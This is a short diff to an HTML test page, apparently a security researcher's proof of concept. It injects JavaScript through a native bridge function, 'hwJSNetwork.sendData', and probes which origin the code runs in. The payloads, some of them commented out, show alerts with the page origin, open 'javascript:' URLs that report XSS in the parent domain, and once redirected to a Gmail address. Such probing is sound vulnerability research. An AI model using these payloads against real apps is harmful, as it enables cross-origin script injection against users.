@@ -1,6 +1,6 @@
 <body>
 <script>
-  hwJSNetwork.sendData("https://", "GET", "", "", "window.addEventListener('readystatechange', (e)=>{ alert(window.location.origin); }); window.addEventListener('DOMContentLoaded', (e)=>{ alert(window.location.origin); }); window.location='https://mail.google.com'; window.alert('sendData:'+window.location.origin); setTimeout(alert(2), 5000); dummy"); 
+  hwJSNetwork.sendData("https://", "GET", "", "", "window.addEventListener('readystatechange', (e)=>{ alert(window.location.origin); }); window.addEventListener('DOMContentLoaded', (e)=>{ alert(window.location.origin); }); window.alert('sendData:'+window.location.origin); setTimeout(alert(2), 5000); dummy"); 
 //  window.location="https://mail.google.com";
 //  window.open('javascript:var elem = document.createElement("p");elem.innerHTML = "<b>Executed JS in parent origin: "+window.location.origin+"</b>"; document.body.append(elem);alert("XSS in doc.domain: "+document.domain+", win.origin: "+window.location.origin)');
 //  window.open("javascript:alert('Executed JS in target '+window.location.origin)");
